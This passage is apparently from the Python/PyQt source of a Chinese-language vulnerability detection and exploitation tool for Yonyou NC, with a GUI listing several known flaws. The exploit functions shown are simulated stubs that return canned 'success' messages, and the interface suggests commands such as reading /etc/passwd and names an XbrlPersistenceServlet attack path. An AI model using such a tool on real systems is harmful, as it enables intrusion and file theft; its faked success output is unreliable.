            error_msg = f'uapjs自定义命令执行错误: {str(e)}'
            return f'❌ 利用失败\n{error_msg}'

    def _exploit_DocServlet_custom(self):
        """利用DocServlet任意文件读取漏洞执行自定义命令（模拟）"""
        try:
            target_url = self.target.rstrip('/')
            
            # 模拟利用过程
            self.msleep(900)  # 模拟网络延迟
            
            # 模拟根据自定义命令返回不同结果
            if self.custom_command.startswith('read:'):
                file_path = self.custom_command[5:]  # 移除"read:"前缀
                result = f'✅ 利用成功\n文件内容: [模拟文件内容 - {file_path}]'
            else:
                result = f'⚠️ 利用成功\n建议使用 "read:文件路径" 格式，如 read:/etc/passwd'
            
            return result
        except Exception as e:
            error_msg = f'DocServlet自定义命令执行错误: {str(e)}'
            return f'自定义命令执行结果: {self.target} 执行失败 - {error_msg}'

    def _exploit_xbrl_persistence_servlet_custom(self):
        """利用XbrlPersistenceServlet反序列化漏洞执行自定义命令（模拟）"""
        try:
            # 从目标URL中提取域名或IP加上端口
            import re
            target_url = self.target.rstrip('/')
            # 提取域名/IP和端口
            match = re.match(r'(https?://)?([^:/]+)(:([0-9]+))?', target_url)
            if not match:
                raise ValueError('无效的目标URL')
            
            scheme = match.group(1) or 'http://'
            host = match.group(2)
            port = match.group(4) or ('443' if scheme == 'https://' else '80')
            
            # 构建请求URL
            base_url = f"{scheme}{host}:{port}"
            exploit_url = f"{base_url}/service/~xbrl/XbrlPersistenceServlet"
            
            # 模拟反序列化攻击
            self.msleep(1000)  # 模拟网络延迟
            
            result = f'✅ 利用成功\n攻击载荷已发送，命令通过反序列化链执行'
            
            return result
        except Exception as e:
            error_msg = f'XbrlPersistenceServlet自定义命令执行错误: {str(e)}'
            return f'自定义命令执行结果: {self.target} 执行失败 - {error_msg}'


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.current_proxy = None
        self.current_dnslog_url = None
        self.scan_thread = None
        self.init_ui()

    def init_ui(self):
        # 设置窗口属性
        self.setWindowTitle('用友 NC 漏洞检测工具')
        self.setMinimumSize(1000, 700)
        
        # 创建中央部件和布局
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        
        # 创建标题标签
        title_label = QLabel('用友 NC 漏洞检测工具')
        title_font = QFont()
        title_font.setPointSize(18)
        title_font.setBold(True)
        title_label.setFont(title_font)
        title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        main_layout.addWidget(title_label)
        
        # 创建全局目标URL输入框
        target_group = QGroupBox('目标设置')
        target_layout = QHBoxLayout()
        target_layout.addWidget(QLabel('目标URL:'))
        self.global_target = QLineEdit()
        self.global_target.setPlaceholderText('https://example.com')
        target_layout.addWidget(self.global_target)
        target_group.setLayout(target_layout)
        main_layout.addWidget(target_group)
        
        # 创建代理设置区域
        self.create_proxy_settings(main_layout)
        
        # 创建DNSLOG设置区域
        self.create_dnslog_settings(main_layout)
        
        # 创建功能选项卡
        self.create_tabs(main_layout)
        
        # 创建状态栏
        self.statusBar().showMessage('就绪')

    def create_proxy_settings(self, parent_layout):
        """创建代理设置区域"""
        proxy_group = QGroupBox('代理设置')
        proxy_layout = QGridLayout()
        
        # 代理类型选择
        proxy_layout.addWidget(QLabel('代理类型:'), 0, 0)
        self.proxy_type = QComboBox()
        self.proxy_type.addItems(['无代理', 'HTTP', 'SOCKS5'])
        self.proxy_type.currentIndexChanged.connect(self.on_proxy_type_changed)
        proxy_layout.addWidget(self.proxy_type, 0, 1)
        
        # 代理服务器地址
        proxy_layout.addWidget(QLabel('代理服务器:'), 1, 0)
        self.proxy_host = QLineEdit()
        self.proxy_host.setPlaceholderText('127.0.0.1')
        self.proxy_host.setEnabled(False)
        proxy_layout.addWidget(self.proxy_host, 1, 1)
        
        # 代理端口
        proxy_layout.addWidget(QLabel('端口:'), 1, 2)
        self.proxy_port = QLineEdit()
        self.proxy_port.setPlaceholderText('8080')
        self.proxy_port.setEnabled(False)
        proxy_layout.addWidget(self.proxy_port, 1, 3)
        
        # 用户名和密码（可选）
        proxy_layout.addWidget(QLabel('用户名:'), 2, 0)
        self.proxy_user = QLineEdit()
        self.proxy_user.setEnabled(False)
        proxy_layout.addWidget(self.proxy_user, 2, 1)
        
        proxy_layout.addWidget(QLabel('密码:'), 2, 2)
        self.proxy_pass = QLineEdit()
        self.proxy_pass.setEchoMode(QLineEdit.EchoMode.Password)
        self.proxy_pass.setEnabled(False)
        proxy_layout.addWidget(self.proxy_pass, 2, 3)
        
        # 应用代理按钮
        self.apply_proxy_btn = QPushButton('应用代理')
        self.apply_proxy_btn.setEnabled(False)
        self.apply_proxy_btn.clicked.connect(self.apply_proxy)
        proxy_layout.addWidget(self.apply_proxy_btn, 3, 0, 1, 4)
        
        proxy_group.setLayout(proxy_layout)
        parent_layout.addWidget(proxy_group)

    def on_proxy_type_changed(self, index):
        """当代理类型改变时启用或禁用相关输入框"""
        is_enabled = index > 0  # 0 表示无代理
        self.proxy_host.setEnabled(is_enabled)
        self.proxy_port.setEnabled(is_enabled)
        self.proxy_user.setEnabled(is_enabled)
        self.proxy_pass.setEnabled(is_enabled)
        self.apply_proxy_btn.setEnabled(is_enabled)

    def apply_proxy(self):
        """应用代理设置"""
        try:
            proxy_type = self.proxy_type.currentText()
            if proxy_type == '无代理':
                self.current_proxy = None
                return
            
            host = self.proxy_host.text().strip()
            port = self.proxy_port.text().strip()
            
            if not host or not port:
                QMessageBox.warning(self, '警告', '请填写完整的代理服务器地址和端口')
                return
            
            try:
                port = int(port)
                if port < 1 or port > 65535:
                    raise ValueError('端口号必须在1-65535之间')
            except ValueError:
                QMessageBox.warning(self, '警告', '端口号必须是有效的数字')
                return
            
            user = self.proxy_user.text().strip()
            password = self.proxy_pass.text().strip()
            
            # 构建代理URL
            if user and password:
                proxy_url = f'{proxy_type.lower()}://{user}:{password}@{host}:{port}'
            else:
                proxy_url = f'{proxy_type.lower()}://{host}:{port}'
            
            self.current_proxy = {
                'http': proxy_url,
                'https': proxy_url
            }
            
            # 禁用代理设置编辑功能区
            self.proxy_type.setEnabled(False)
            self.proxy_host.setEnabled(False)
            self.proxy_port.setEnabled(False)
            self.proxy_user.setEnabled(False)
            self.proxy_pass.setEnabled(False)
            
            # 更改按钮文本和连接的槽函数
            self.apply_proxy_btn.setText('停止代理')
            # 具体断开与apply_proxy方法的连接
            try:
                self.apply_proxy_btn.clicked.disconnect(self.apply_proxy)
            except TypeError:
                # 如果没有连接，忽略错误
                pass
            self.apply_proxy_btn.clicked.connect(self.stop_proxy)
            
            self.statusBar().showMessage(f'已应用{proxy_type}代理')
        except Exception as e:
            QMessageBox.critical(self, '错误', f'应用代理失败: {str(e)}')
    
    def stop_proxy(self):
        """停止代理设置"""
        # 清除代理设置
        self.current_proxy = None
        
        # 恢复代理设置编辑功能区
        self.proxy_type.setEnabled(True)
        # 根据当前代理类型决定是否启用其他输入框
        is_enabled = self.proxy_type.currentIndex() > 0
        self.proxy_host.setEnabled(is_enabled)
        self.proxy_port.setEnabled(is_enabled)
        self.proxy_user.setEnabled(is_enabled)
        self.proxy_pass.setEnabled(is_enabled)
        
        # 更改按钮文本和连接的槽函数
        self.apply_proxy_btn.setText('应用代理')
        # 具体断开与stop_proxy方法的连接
        try:
            self.apply_proxy_btn.clicked.disconnect(self.stop_proxy)
        except TypeError:
            # 如果没有连接，忽略错误
            pass
        self.apply_proxy_btn.clicked.connect(self.apply_proxy)
        
        self.statusBar().showMessage('已停止代理')

    def create_dnslog_settings(self, parent_layout):
        """创建DNSLOG设置区域"""
        dnslog_group = QGroupBox('DNSLOG设置')
        dnslog_layout = QHBoxLayout()
        
        # DNSLOG域名输入框
        dnslog_layout.addWidget(QLabel('DNSLOG domain:'))
        self.dnslog_url = QLineEdit()
        self.dnslog_url.setPlaceholderText('dnslog.example.com')
        dnslog_layout.addWidget(self.dnslog_url)
        
        # 保存按钮
        self.save_dnslog_btn = QPushButton('保存')
        self.save_dnslog_btn.clicked.connect(self.save_dnslog)
        dnslog_layout.addWidget(self.save_dnslog_btn)
        
        dnslog_group.setLayout(dnslog_layout)
        parent_layout.addWidget(dnslog_group)

    def save_dnslog(self):
        """保存DNSLOG设置"""
        dnslog_url = self.dnslog_url.text().strip()
        
        if not dnslog_url:
            QMessageBox.warning(self, '警告', '请输入DNSLOG域名')
            return
        
        # 保存DNSLOG URL到实例变量
        self.current_dnslog_url = dnslog_url
        
        QMessageBox.information(self, '成功', f'DNSLOG域名已保存: {dnslog_url}')
        self.statusBar().showMessage(f'DNSLOG域名已设置: {dnslog_url}')

    def create_tabs(self, parent_layout):
        """创建功能选项卡"""
        self.tabs = QTabWidget()
        
        # 创建漏洞检测选项卡
        self.detect_tab = QWidget()
        self.create_detect_tab()
        self.tabs.addTab(self.detect_tab, '漏洞检测')
        
        # 创建漏洞利用选项卡
        self.exploit_tab = QWidget()
        self.create_exploit_tab()
        self.tabs.addTab(self.exploit_tab, '漏洞利用')
        
        parent_layout.addWidget(self.tabs)

    def create_detect_tab(self):
        """创建漏洞检测选项卡"""
        layout = QVBoxLayout(self.detect_tab)
        
        # 漏洞选项选择
        vuln_layout = QHBoxLayout()
        vuln_layout.addWidget(QLabel('漏洞选项:'))
        self.vuln_type = QComboBox()
        self.vuln_type.addItems([
            '全部', 
            'BshServlet命令执行', 
            'grouptemplet 文件上传', 
            'uapjs 命令执行',
            'DocServlet 任意文件读取',
            'XbrlPersistenceServlet 反序列化'
        ])
        vuln_layout.addWidget(self.vuln_type)
        layout.addLayout(vuln_layout)
        
        # 扫描按钮
        button_layout = QHBoxLayout()
        self.start_detect_btn = QPushButton('开始检测')
        self.start_detect_btn.clicked.connect(self.start_detection)
        button_layout.addWidget(self.start_detect_btn)
        layout.addLayout(button_layout)
        
        # 检测结果
        layout.addWidget(QLabel('检测结果:'))
        self.detect_result = QTextEdit()
        self.detect_result.setReadOnly(True)
        layout.addWidget(self.detect_result)

    def create_exploit_tab(self):
        """创建漏洞利用选项卡"""
        layout = QVBoxLayout(self.exploit_tab)
        
        # 漏洞选项选择
        vuln_layout = QHBoxLayout()
        vuln_layout.addWidget(QLabel('漏洞选项:'))
        self.exploit_vuln = QComboBox()
        self.exploit_vuln.addItems([
            '请选择漏洞',
            'BshServlet命令执行', 
            'grouptemplet 文件上传', 
            'uapjs 命令执行',
            'DocServlet 任意文件读取',
            'XbrlPersistenceServlet 反序列化'
        ])
        vuln_layout.addWidget(self.exploit_vuln)
        layout.addLayout(vuln_layout)
        
        # 自定义命令执行区域
        custom_cmd_group = QGroupBox('自定义命令执行')
        custom_cmd_layout = QVBoxLayout()
        
        # 命令输入
        cmd_input_layout = QHBoxLayout()
        cmd_input_layout.addWidget(QLabel('执行命令:'))
        self.custom_command = QLineEdit()
        self.custom_command.setPlaceholderText('输入要执行的命令，如: whoami, id, cat /etc/passwd')
        cmd_input_layout.addWidget(self.custom_command)
        custom_cmd_layout.addLayout(cmd_input_layout)
        
        # 执行按钮
        exec_button_layout = QHBoxLayout()
        self.exec_custom_cmd_btn = QPushButton('执行自定义命令')
        self.exec_custom_cmd_btn.clicked.connect(self.execute_custom_command)
        exec_button_layout.addWidget(self.exec_custom_cmd_btn)
        custom_cmd_layout.addLayout(exec_button_layout)
        
        custom_cmd_group.setLayout(custom_cmd_layout)
        layout.addWidget(custom_cmd_group)
        
        # 利用按钮
        button_layout = QHBoxLayout()
        self.start_exploit_btn = QPushButton('开始利用')
        self.start_exploit_btn.clicked.connect(self.start_exploitation)
        button_layout.addWidget(self.start_exploit_btn)
        layout.addLayout(button_layout)
        
        # 利用结果
        layout.addWidget(QLabel('利用结果:'))
        self.exploit_result = QTextEdit()
        self.exploit_result.setReadOnly(True)
        layout.addWidget(self.exploit_result)

    def start_detection(self):
        """开始漏洞检测"""
        target = self.global_target.text().strip()
        if not target:
            QMessageBox.warning(self, '警告', '请输入目标URL')
            return
        
        # 检查线程是否已在运行
        if self.scan_thread and self.scan_thread.isRunning():
            QMessageBox.warning(self, '警告', '扫描线程已在运行中')
            return
        
        # 创建并启动扫描线程
        self.scan_thread = ScanThread(target, self.current_proxy, 'detect', getattr(self, 'current_dnslog_url', None))
        self.scan_thread.result_signal.connect(self.on_detection_result)
        self.scan_thread.finished.connect(self.on_scan_finished)
        
        # 更新UI状态
        self.start_detect_btn.setEnabled(False)
        self.statusBar().showMessage('正在进行漏洞检测...')
        
        # 启动线程
        self.scan_thread.start()


    def on_detection_result(self, result):
        """处理漏洞检测结果，添加视觉提示"""
        # 保存当前光标位置
        cursor = self.detect_result.textCursor()
        
        # 首先移动到文本末尾
        cursor.movePosition(QTextCursor.MoveOperation.End)
        
        # 如果当前已经有文本，添加换行分隔
        if not self.detect_result.document().isEmpty():
            cursor.insertText('\n\n')
        
        # 按行分割结果，支持多个漏洞检测结果
        lines = result.split('\n')
        is_first_line = True
        
        for line in lines:
            # 跳过空行
            if not line.strip():
                continue
                
            # 判断漏洞状态并添加相应的视觉提示
            if '存在' in line and ('漏洞' in line or '可能存在' in line):
                # 存在漏洞 - 添加绿色对号
                format_green = QTextCharFormat()
                format_green.setForeground(QColor('green'))
                format_green.setFontWeight(QFont.Weight.Bold)
                cursor.insertText('✅ ', format_green)
            elif '未检测到' in line:
                # 不存在漏洞 - 添加红色x号
                format_red = QTextCharFormat()
                format_red.setForeground(QColor('red'))
                format_red.setFontWeight(QFont.Weight.Bold)
                cursor.insertText('❌ ', format_red)
            elif '失败' in line:
                # 检测失败 - 添加黄色感叹号
                format_yellow = QTextCharFormat()
                format_yellow.setForeground(QColor('orange'))
                format_yellow.setFontWeight(QFont.Weight.Bold)
                cursor.insertText('⚠️ ', format_yellow)
            else:
                # 其他情况 - 使用默认格式
                default_format = QTextCharFormat()
                cursor.setCharFormat(default_format)
            
            # 创建默认格式（重置所有格式设置）
            default_format = QTextCharFormat()
            cursor.setCharFormat(default_format)
            
            # 插入文本内容
            cursor.insertText(line + '\n')
            is_first_line = False
        
        # 滚动到底部
        self.detect_result.moveCursor(QTextCursor.MoveOperation.End)

    def start_exploitation(self):
        """开始漏洞利用"""
        target = self.global_target.text().strip()
        if not target:
            QMessageBox.warning(self, '警告', '请输入目标URL')
            return
        
        vuln_index = self.exploit_vuln.currentIndex()
        if vuln_index <= 0:
            QMessageBox.warning(self, '警告', '请选择要利用的漏洞')
            return
        
        # 获取选择的漏洞类型
        selected_vuln = self.exploit_vuln.currentText()
        
        # 检查线程是否已在运行
        if self.scan_thread and self.scan_thread.isRunning():
            QMessageBox.warning(self, '警告', '利用线程已在运行中')
            return
        
        # 创建并启动利用线程
        self.scan_thread = ScanThread(target, self.current_proxy, 'exploit', getattr(self, 'current_dnslog_url', None), selected_vuln)
        self.scan_thread.result_signal.connect(self.on_exploitation_result)
        self.scan_thread.finished.connect(self.on_scan_finished)
        
        # 更新UI状态
        self.start_exploit_btn.setEnabled(False)
        self.statusBar().showMessage('正在进行漏洞利用...')
        
        # 启动线程
        self.scan_thread.start()


    def execute_custom_command(self):
        """执行自定义命令"""
        target = self.global_target.text().strip()
        if not target:
            QMessageBox.warning(self, '警告', '请输入目标URL')
            return
        
        command = self.custom_command.text().strip()
        if not command:
            QMessageBox.warning(self, '警告', '请输入要执行的命令')
            return
        
        vuln_index = self.exploit_vuln.currentIndex()
        if vuln_index <= 0:
            QMessageBox.warning(self, '警告', '请先选择漏洞类型')
            return
        
        # 获取选择的漏洞类型
        selected_vuln = self.exploit_vuln.currentText()
        
        # 检查线程是否已在运行
        if self.scan_thread and self.scan_thread.isRunning():
            QMessageBox.warning(self, '警告', '扫描线程已在运行中')
            return
        
        # 创建并启动自定义命令执行线程
        self.scan_thread = ScanThread(target, self.current_proxy, 'exploit_custom', getattr(self, 'current_dnslog_url', None), selected_vuln, command)
        self.scan_thread.result_signal.connect(self.on_custom_command_result)
        self.scan_thread.finished.connect(self.on_scan_finished)
        
        # 更新UI状态
        self.exec_custom_cmd_btn.setEnabled(False)
        self.custom_command.setEnabled(False)
        self.statusBar().showMessage(f'正在执行自定义命令: {command}')
        
        # 启动线程
        self.scan_thread.start()

    def on_custom_command_result(self, result):
        """处理自定义命令执行结果，输出到利用结果窗口"""
        # 保存当前光标位置
        cursor = self.exploit_result.textCursor()
        
        # 首先移动到文本末尾
        cursor.movePosition(QTextCursor.MoveOperation.End)
        
        # 如果当前已经有文本，添加换行分隔
        if not self.exploit_result.document().isEmpty():
            cursor.insertText('\n\n')
        
        # 添加自定义命令标识
        custom_label_format = QTextCharFormat()
        custom_label_format.setForeground(QColor('blue'))
        custom_label_format.setFontWeight(QFont.Weight.Bold)
        cursor.insertText('=== 自定义命令执行结果 ===\n', custom_label_format)
        
        # 按行分割结果
        lines = result.split('\n')
        is_first_line = True
        
        for line in lines:
            # 跳过空行
            if not line.strip():
                continue
                
            # 判断命令执行状态并添加相应的视觉提示
            if '执行成功' in line and ('✅' in line or '成功' in line):
                # 执行成功 - 添加绿色对号
                format_green = QTextCharFormat()
                format_green.setForeground(QColor('green'))
                format_green.setFontWeight(QFont.Weight.Bold)
                cursor.insertText('✅ ', format_green)
            elif '执行失败' in line or '❌' in line:
                # 执行失败 - 添加红色x号
                format_red = QTextCharFormat()
                format_red.setForeground(QColor('red'))
                format_red.setFontWeight(QFont.Weight.Bold)
                cursor.insertText('❌ ', format_red)
            elif '⚠️' in line or '警告' in line:
                # 警告信息 - 添加黄色感叹号
                format_yellow = QTextCharFormat()
                format_yellow.setForeground(QColor('orange'))
                format_yellow.setFontWeight(QFont.Weight.Bold)
                cursor.insertText('⚠️ ', format_yellow)
            else:
                # 其他情况 - 使用默认格式
                default_format = QTextCharFormat()
                cursor.setCharFormat(default_format)
            
            # 创建默认格式（重置所有格式设置）
            default_format = QTextCharFormat()
            cursor.setCharFormat(default_format)
            
            # 插入文本内容
            cursor.insertText(line + '\n')
            is_first_line = False
        
        # 滚动到底部
        self.exploit_result.moveCursor(QTextCursor.MoveOperation.End)

    def on_exploitation_result(self, result):
        """处理漏洞利用结果"""
        self.exploit_result.append(result)

    def on_scan_finished(self):
        """扫描或利用完成后的处理"""
        # 恢复UI状态
        self.start_detect_btn.setEnabled(True)
        self.start_exploit_btn.setEnabled(True)
        
        # 恢复自定义命令执行UI状态
        self.exec_custom_cmd_btn.setEnabled(True)
        self.custom_command.setEnabled(True)
        
        self.statusBar().showMessage('就绪')

    def closeEvent(self, event):
        """窗口关闭事件"""
        # 确保在关闭窗口时停止所有线程
        if self.scan_thread and self.scan_thread.isRunning():
            self.scan_thread.terminate()
            self.scan_thread.wait()
        event.accept()


if __name__ == '__main__':
    # 创建应用程序实例
    app = QApplication(sys.argv)
    
    # 设置应用程序样式
    app.setStyle('Fusion')
    
    # 设置应用程序图标（显示在Dock栏）
    icon_path = os.path.join('static', 'icon.icns')
    if os.path.exists(icon_path):
        app.setWindowIcon(QIcon(icon_path))
    else:
        print(f'警告: 图标文件未找到: {icon_path}')
    
    # 创建并显示主窗口
    window = MainWindow()
    window.show()
    
    # 运行应用程序主循环
    sys.exit(app.exec())